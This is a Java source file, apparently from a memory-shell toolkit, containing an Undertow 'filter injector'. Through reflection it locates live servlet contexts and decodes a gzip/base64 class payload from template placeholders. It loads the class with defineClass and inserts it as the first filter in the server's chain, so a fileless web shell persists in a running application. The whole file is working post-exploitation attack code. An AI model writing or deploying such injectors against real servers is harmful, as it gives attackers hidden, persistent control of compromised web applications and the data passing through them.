package com.reajason.javaweb.memsell.undertow.injector;

import javax.servlet.DispatcherType;
import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.zip.GZIPInputStream;


/**
 * @author ReaJason
 */
public class UndertowFilterInjector {

    static {
        new UndertowFilterInjector();
    }


    public UndertowFilterInjector() {
        try {
            List<Object> contexts = getContext();
            for (Object context : contexts) {
                Object filter = getFilter(context);
                addFilter(context, filter);
            }
        } catch (Exception ignored) {
        }
    }

    @SuppressWarnings("all")
    static byte[] decodeBase64(String base64Str) throws ClassNotFoundException, NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class<?> decoderClass;
        try {
            decoderClass = Class.forName("sun.misc.BASE64Decoder");
            return (byte[]) decoderClass.getMethod("decodeBuffer", String.class).invoke(decoderClass.newInstance(), base64Str);
        } catch (Exception ignored) {
            decoderClass = Class.forName("java.util.Base64");
            Object decoder = decoderClass.getMethod("getDecoder").invoke(null);
            return (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, base64Str);
        }
    }

    @SuppressWarnings("all")
    public static byte[] gzipDecompress(byte[] compressedData) throws IOException {
        ByteArrayOutputStream out = new ByteArrayOutputStream();
        ByteArrayInputStream in = new ByteArrayInputStream(compressedData);
        GZIPInputStream ungzip = new GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) {
            out.write(buffer, 0, n);
        }
        return out.toByteArray();
    }

    @SuppressWarnings("all")
    static Object getFV(Object obj, String fieldName) throws Exception {
        try {
            Field field = getF(obj, fieldName);
            field.setAccessible(true);
            return field.get(obj);
        } catch (Exception e) {
            return null;
        }
    }

    static Field getF(Object obj, String fieldName) throws NoSuchFieldException {
        Class<?> clazz = obj.getClass();
        while (clazz != null) {
            try {
                Field field = clazz.getDeclaredField(fieldName);
                field.setAccessible(true);
                return field;
            } catch (NoSuchFieldException e) {
                clazz = clazz.getSuperclass();
            }
        }
        throw new NoSuchFieldException(fieldName);
    }

    public static void setFieldValue(final Object obj, final String fieldName, final Object value) throws Exception {
        Field field = getF(obj, fieldName);
        field.set(obj, value);
    }

    static synchronized Object invokeMethod(Object targetObject, String methodName) throws NoSuchMethodException, IllegalAccessException, InvocationTargetException {
        return invokeMethod(targetObject, methodName, new Class[0], new Object[0]);
    }

    @SuppressWarnings("all")
    public static synchronized Object invokeMethod(final Object obj, final String methodName, Class[] paramClazz, Object[] param) throws NoSuchMethodException, InvocationTargetException, IllegalAccessException {
        Class clazz = (obj instanceof Class) ? (Class) obj : obj.getClass();
        Method method = null;
        Class tempClass = clazz;
        while (method == null && tempClass != null) {
            try {
                if (paramClazz == null) {
                    // Get all declared methods of the class
                    Method[] methods = tempClass.getDeclaredMethods();
                    for (int i = 0; i < methods.length; i++) {
                        if (methods[i].getName().equals(methodName) && methods[i].getParameterTypes().length == 0) {
                            method = methods[i];
                            break;
                        }
                    }
                } else {
                    method = tempClass.getDeclaredMethod(methodName, paramClazz);
                }
            } catch (NoSuchMethodException e) {
                tempClass = tempClass.getSuperclass();
            }
        }
        if (method == null) {
            throw new NoSuchMethodException(methodName);
        }
        method.setAccessible(true);
        if (obj instanceof Class) {
            try {
                return method.invoke(null, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        } else {
            try {
                return method.invoke(obj, param);
            } catch (IllegalAccessException e) {
                throw new RuntimeException(e.getMessage());
            }
        }
    }

    public String getUrlPattern() {
        return "{{urlPattern}}";
    }

    public String getClassName() {
        return "{{className}}";
    }

    public String getBase64String() throws IOException {
        return "{{base64Str}}";
    }

    public List<Object> getContext() throws IllegalAccessException, NoSuchMethodException, InvocationTargetException {
        List<Object> contexts = new ArrayList<Object>();
        Thread[] threads = (Thread[]) invokeMethod(Thread.class, "getThreads");
        for (Thread thread : threads) {
            try {
                Object requestContext = invokeMethod(thread.getContextClassLoader().loadClass("io.undertow.servlet.handlers.ServletRequestContext"), "current");
                Object servletContext = invokeMethod(requestContext, "getCurrentServletContext");
                if (servletContext != null) {
                    contexts.add(servletContext);
                }
            } catch (Exception ignored) {
            }
        }
        return contexts;
    }

    private Object getFilter(Object context) {
        Object filter = null;
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        if (classLoader == null) {
            classLoader = context.getClass().getClassLoader();
        }
        try {
            filter = classLoader.loadClass(getClassName()).newInstance();
        } catch (Exception e) {
            try {
                byte[] clazzByte = gzipDecompress(decodeBase64(getBase64String()));
                Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                defineClass.setAccessible(true);
                Class<?> clazz = (Class<?>) defineClass.invoke(classLoader, clazzByte, 0, clazzByte.length);
                filter = clazz.newInstance();
            } catch (Throwable ignored) {
            }
        }
        return filter;
    }

    public void addFilter(Object context, Object filter) {
        String filterClassName = filter.getClass().getName();
        try {
            if (isInjected(context, filterClassName)) {
                return;
            }
            Class<?> filterInfoClass = Class.forName("io.undertow.servlet.api.FilterInfo");
            Object deploymentInfo = getFV(context, "deploymentInfo");
            Object filterInfo = filterInfoClass.getConstructor(String.class, Class.class).newInstance(filterClassName, filter.getClass());
            invokeMethod(deploymentInfo, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
            Object deploymentImpl = getFV(context, "deployment");
            Object managedFilters = invokeMethod(deploymentImpl, "getFilters");
            invokeMethod(managedFilters, "addFilter", new Class[]{filterInfoClass}, new Object[]{filterInfo});
            invokeMethod(deploymentInfo, "insertFilterUrlMapping", new Class[]{int.class, String.class, String.class, DispatcherType.class}, new Object[]{0, filterClassName, getUrlPattern(), DispatcherType.REQUEST});
        } catch (Throwable e) {
            e.printStackTrace();
        }
    }

    @SuppressWarnings("unchecked")
    public boolean isInjected(Object context, String evilClassName) throws Exception {
        Map<String, Object> filters = (HashMap<String, Object>) getFV(getFV(context, "deploymentInfo"), "filters");
        if (filters != null) {
            for (Map.Entry<String, Object> filter : filters.entrySet()) {
                Class<?> filterClass = (Class<?>) getFV(filter.getValue(), "filterClass");
                if (filterClass != null) {
                    if (filterClass.getName().equals(evilClassName)) {
                        return true;
                    }
                }
            }
        }
        return false;
    }
}
